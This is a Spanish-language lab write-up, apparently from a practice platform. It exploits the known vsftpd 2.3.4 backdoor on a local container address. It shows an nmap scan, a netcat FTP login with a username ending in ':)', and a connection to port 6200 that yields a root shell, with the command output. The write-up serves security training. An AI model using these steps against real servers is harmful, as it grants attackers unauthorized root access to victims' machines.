# Lab FirstHacking

## Descripción

Laboratorio para practicar la explotación del backdoor de **vsftpd 2.3.4** para obtener acceso como **root**.

## Investigación

Investigando la descripción del laboratorio, se identifica que **vsftpd 2.3.4** contiene una puerta trasera. El exploit consiste en iniciar sesión en el servicio FTP utilizando un nombre de usuario que termine con una cara feliz (`:)`) y cualquier contraseña. Esto habilita una puerta trasera que queda escuchando en el puerto **6200**.

## Escaneo con Nmap

Primero se verifica que el puerto 21 (FTP) está abierto.

```bash
nmap 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 10:27 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 8A:6A:11:25:71:A8 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
```

## Explotación

Se establece una conexión con el servicio FTP mediante `netcat` y se envía un usuario terminado en `:)` junto con cualquier contraseña.

```bash
nc 172.17.0.2 21

220 (vsFTPd 2.3.4)
USER prueba:)
331 Please specify the password.
PASS 123
```

Al realizar esto, el backdoor queda disponible en el puerto **6200**.

## Acceso como root

Ahora se abre una conexión al puerto 6200.

```bash
nc 172.17.0.2 6200
```

Una vez conectado, se verifica el acceso ejecutando los siguientes comandos:

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Con esto se obtiene acceso como **root** en la máquina.
